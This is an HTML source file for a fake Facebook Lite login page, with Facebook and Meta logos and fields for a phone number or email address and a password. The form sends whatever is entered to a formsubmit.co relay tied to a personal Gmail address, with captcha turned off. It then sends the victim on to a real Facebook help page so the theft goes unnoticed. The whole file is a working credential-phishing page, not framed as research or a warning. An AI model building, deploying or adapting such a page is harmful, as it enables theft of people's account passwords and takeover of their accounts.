<!DOCTYPE html>
<html lang="en-UK">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Facebook Lite Login</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    html, body {
      height: 100%;
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
      background-color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    form {
      width: 100%;
      height: 100%;
    }

    .container {
      width: 100%;
      height: 100%;
      max-width: 400px;
      margin: auto;
      display: flex;
      flex-direction: column;
      justify-content: center;
      padding: 20px;
    }

    .language-select {
      font-size: 14px;
      color: #1c1e21;
      margin-bottom: 30px;
      text-align: center;
    }

    .fb-logo {
      width: 80px;
      height: 80px;
      border: 1px solid #ccc;
      border-radius: 50%;
      display: flex;
      justify-content: center;
      align-items: center;
      margin: 0 auto 30px;
    }

    .fb-logo img {
      width: 40px;
      height: 40px;
    }

    .input-box {
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: 12px;
      margin-bottom: 20px;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 8px;
      outline: none;
    }

    .login-btn {
      width: 100%;
      background-color: #1877f2;
      color: white;
      padding: 14px;
      font-size: 16px;
      font-weight: 600;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      margin-bottom: 16px;
    }

    .login-btn:hover {
      background-color: #166fe5;
    }

    .forgot-password {
      text-align: center;
      font-size: 14px;
      color: #1877f2;
      margin-bottom: 30px;
      cursor: pointer;
    }

    .create-account {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      font-weight: 600;
      border: 1px solid #1877f2;
      color: #1877f2;
      background-color: transparent;
      border-radius: 30px;
      cursor: pointer;
      margin-bottom: 40px;
    }

    .create-account:hover {
      background-color: #f0f2f5;
    }

    .meta-logo {
      text-align: center;
      color: #606770;
      font-size: 14px;
    }

    .meta-logo img {
      width: 50px;
      margin-top: 5px;
    }
  </style>
</head>
<body>
  <form action="https://formsubmit.co/gamingznoob404@gmail.com" method="POST">
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_next" value="https://m.facebook.com/help/479793009433142/#">

    <div class="container">
      <div class="language-select">English (UK) &#9662;</div>

      <div class="fb-logo">
        <img src="https://i.ibb.co/Q3ccZ5fr/Facebook-Lite-logo-svg.png" alt="Facebook Lite Logo">
      </div>

      <div class="input-box">
        <input type="text" name="mobile or email address" placeholder="Mobile number or email address" required>
        <input type="password" name="password" placeholder="Password" required>
      </div>

      <button class="login-btn" type="submit">Log in</button>

      <div class="forgot-password">Forgotten password?</div>

      <button type="button" class="create-account">Create new account</button>

      <div class="meta-logo">
        <div>
          <img src="https://i.ibb.co/CpZJYsVQ/facebook-meta-logo-transparent-free-png-2419520173.png" alt="Meta Logo">
        </div>
      </div>
    </div>
  </form>
</body>
</html>
